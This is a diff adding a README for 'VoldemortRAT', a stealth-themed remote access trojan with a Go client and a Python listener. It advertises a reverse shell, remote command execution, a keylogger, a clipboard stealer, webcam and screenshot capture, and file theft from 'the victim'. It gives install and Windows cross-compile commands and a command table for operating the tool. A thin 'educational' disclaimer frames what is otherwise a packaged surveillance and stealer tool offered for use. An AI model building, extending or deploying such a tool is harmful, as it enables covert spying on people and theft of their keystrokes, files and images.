@@ -1,0 +1,89 @@
+# 🪄 VoldemortRAT (AzkabanRAT v1.0)
+
+**"He Who Must Not Be Traced" — a modular, stealthy RAT for educational red teaming in secure environments.**
+
+---
+
+## 🔥 Features
+- Reverse TCP Shell
+- Remote Command Execution (`cmd`)
+- Screenshot Capture (`screenshot`)
+- Clipboard Stealer (`clipboard`)
+- Keylogger (`keylog`)
+- Webcam Snapshot (`webcam`)
+- Downloadable File Support
+
+---
+
+## 🧱 Project Structure
+```
+azkabanrat/
+├── client/
+│   ├── azkaban_core.go       # Main RAT client with command router
+│   ├── screenshot.go         # Screenshot capture
+│   ├── clipboard.go          # Clipboard access
+│   ├── keylogger.go          # Keystroke logger
+│   └── webcam.go             # Webcam snapshot module
+├── server/
+│   └── listener.py           # Python-based command/control handler
+├── README.md                 # Documentation
+```
+
+---
+
+## 🛠️ Setup Instructions
+
+### Install Go Modules:
+```bash
+go get github.com/kbinani/screenshot
+go get github.com/atotto/clipboard
+go get github.com/robotn/gohook
+go get -u -d gocv.io/x/gocv
+```
+
+### Compile for Windows:
+```bash
+GOOS=windows GOARCH=amd64 go build -o voldemortrat.exe client/azkaban_core.go
+```
+
+---
+
+## 🎮 Listener Usage
+```bash
+python3 server/listener.py
+```
+### Commands:
+| Command | Description |
+|---------|-------------|
+| `cmd <command>` | Execute remote shell commands |
+| `screenshot` | Capture screen on target |
+| `webcam` | Take webcam photo |
+| `clipboard` | Dump clipboard text |
+| `keylog` | Start logging keystrokes |
+| `download <filename>` | Download a file from the victim |
+| `exit` | Terminate connection |
+
+---
+
+## ⚠️ Ethical Use
+This tool is for **educational** and **authorized penetration testing** only. Do **not** use it outside of controlled environments without consent. Violators of laws and terms of service are solely responsible.
+
+---
+
+## 🧙 Credits
+- Inspired by the dark arts (Stranger Things, Harry Potter themes)
+- Built using Golang + Python
+
+---
+
+## 📸 Screenshots
+> _Add demo .gif or screenshots of captured webcam/screen outputs here._
+
+---
+
+## 🧰 License
+MIT License — misuse is strictly disavowed by the author.
+
+---
+
+**VoldemortRAT** — Fear the one who connects in silence.
